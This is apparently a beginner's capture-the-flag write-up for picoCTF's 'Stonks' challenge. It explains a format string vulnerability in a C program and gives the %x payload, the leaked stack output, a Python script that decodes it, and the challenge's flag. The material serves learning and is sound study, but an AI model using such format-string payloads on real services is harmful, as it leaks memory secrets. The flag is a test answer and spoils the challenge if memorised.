# Stonks

### Disclaimer:
This is my first ctf within the binary_exploitation category. Therefore I used another writeup by [Abraxus](https://ctftime.org/user/100246) on CTFtime.org (Link to writeup: https://ctftime.org/writeup/28935) for own learning.

### Task description:

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!

### So we begin

1. We open the c-file, connect in our shell and read hint to see where to look for our flag. 

  What we see is that our flag is in a separate file on the server and is beaing read and stored in the variable ```api_buf```.

  ![Code snippet of filestream being read into variable in memory](https://raw.githubusercontent.com/ulrikHesmyr/picoCTF/main/picoGym/binary_exploitation/stonks/images/our_flag_stored_in_variable.png)

  This means:
  - Our flag is stored in a local variable in the so called "stack" (inside memory)

  We also know:
  - printf() function can print out stuff from the stack, and not only normal stuff, we can make it print out our flag if there is code that lets us do it.

  Therefore, we take a look at the hint once more. 

  ![Hint says: Okay, maybe I'd believe you if you find my API key.](https://raw.githubusercontent.com/ulrikHesmyr/picoCTF/main/picoGym/binary_exploitation/stonks/images/hint.png)

  And we find the snippet that the hint refers to:

  ![Code snippet of functions that stores user input in variable, and print the exact variable right back to us](https://raw.githubusercontent.com/ulrikHesmyr/picoCTF/main/picoGym/binary_exploitation/stonks/images/bingo.png)

  Bingo! We found the vulnerability that we want to exploit to get our flag.

  What we see:
  - scanf() function that reads whatever you write into the buffer, and stores it into a variable called ```user_buf```
  - printf() function that writes your exact input, right back at us.

  What we know (or should know):
  - printf() in combination with format specifiers can print out variables from the stack. I.e. %s print out strings, %i print out int AND MOST IMPORTANT %x print out hexadecimal.
  - By using a bunch of format specifiers, we will be able to print out all the variables stored in the stack (i.e %s, %c, %f etc.)

  And THIS IS GOOD, because:
  - If we, instead of sending a "API token" as it requests, we send a string containing our format specifiers, we will then make the process that runs on the server, **to print out whatever is stored in the stack**, which is in this case our flag. (use hiphens in between because our variable ```user_buf``` is a char pointer and not a string)

  Our input:

  ```text
  %x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x
  ```

  2. Copy and paste into your shell:

  !["What is your API token?" written in bash](https://raw.githubusercontent.com/ulrikHesmyr/picoCTF/main/picoGym/binary_exploitation/stonks/images/what_is_your_api_token.png)

  Then we see the data being printed back to us!

  ![Data from the stack written in bash](https://raw.githubusercontent.com/ulrikHesmyr/picoCTF/main/picoGym/binary_exploitation/stonks/images/buying_stonks_with_token.png)

  Now we see we cant read it, but we can format it by making a small program.

  We use the following program provided in the other writeup by Abraxus.

  Our output:

  ```
  9692350-804b000-80489c3-f7fa9d80-ffffffff-1-9690160-f7fb7110-f7fa9dc7-0-9691180-5-9692330-9692350-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-35343036-64303664-ffcf007d-f7fe4af8-f7fb7440
  ``` 

  3. Copy and paste your output into the variable ```ourEncodedFlag```

  ```python
  #Output that we got from the server
ourEncodedFlag = "9692350-804b000-80489c3-f7fa9d80-ffffffff-1-9690160-f7fb7110-f7fa9dc7-0-9691180-5-9692330-9692350-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-35343036-64303664-ffcf007d-f7fe4af8-f7fb7440"

#The string we will store our flag in
s = ""

#Iterating through each hex value in ourEncodedFlag
for i in ourEncodedFlag.split('-'):

    #If the length of the string is 8, we know it is valid hex value that stores a character
    if len(i) == 8:
        a = bytearray.fromhex(i)

        #Iterating through each byte in the bytearray and reversing it because of endianness
        for b in reversed(a):

            #If the byte is a valid ascii character, we add it to our string
            if b > 32 and b < 128:
                s += chr(b)


print(s)    #output: qpicoCTF{I_l05t_4ll_my_m0n3y_6045d60d}J@t
  ```

  4. Copy the python code above, paste it into a python file (.py) on your computer and run it

  This gives us - in our case - the flag:

  ```
  picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
  ```

  **NB!** The flag can differ depending on which instance (which port) you are connecting to. (i.e 20195 is my port: nc mercury.picoctf.net 20195)

    
